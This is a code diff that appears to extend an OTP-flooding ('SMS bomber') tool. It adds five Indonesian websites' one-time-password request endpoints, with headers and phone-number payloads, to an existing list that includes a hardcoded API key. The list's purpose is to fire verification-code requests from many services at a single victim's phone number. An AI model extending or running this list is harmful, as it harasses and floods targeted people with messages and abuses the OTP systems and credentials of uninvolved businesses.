@@ -37,4 +37,9 @@ def _x(ph):
         ("BodyShop","https://ms-api.thebodyshop.co.id/users/v1/otp/request",{"Content-Type":"application/json","Accept":"application/json"},{"identifier":_f08(ph),"otpType":"WA"}),
         ("BMMParts","https://bmmparts.co.id/api/v1/auth/request-otp",{"Content-Type":"application/json","Accept":"*/*","Api-Key":"28EBBA656ED772A7BF319A79D1FBDB051411DCB7AF47DD09845FF5F7F09267E0","Origin":"https://bmmparts.co.id","Referer":"https://bmmparts.co.id/login"},{"phoneNumber":_fnocode(ph)}),
         ("Edelweiss","https://devel-cnn.edelweiss.id/api/auth/otp/send",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_fplus(ph)}),
-                                                                        ]
+        ("Merupakan","https://merupakan.id/wp-json/merupakan/v1/otp/send",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_fnocode(ph)}),
+        ("DzakiArrafi","https://dzakiarrafi.my.id/api/send_otp.php",{"Content-Type":"application/x-www-form-urlencoded"},{"no_wa":_f08(ph),"is_form":True}),
+        ("Trive","https://api.trive.co.id/api/auth/send-verification-code",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_fnocode(ph),"countryCode":"+62"}),
+        ("ITSolution","https://forum.itsolution.id/api/request_otp",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_f62(ph)}),
+        ("SobatWarung","https://sobatwarung.id/api/auth/otp/send",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_f08(ph)}),
+                                                                                                                                                                                                                                                                                        ]
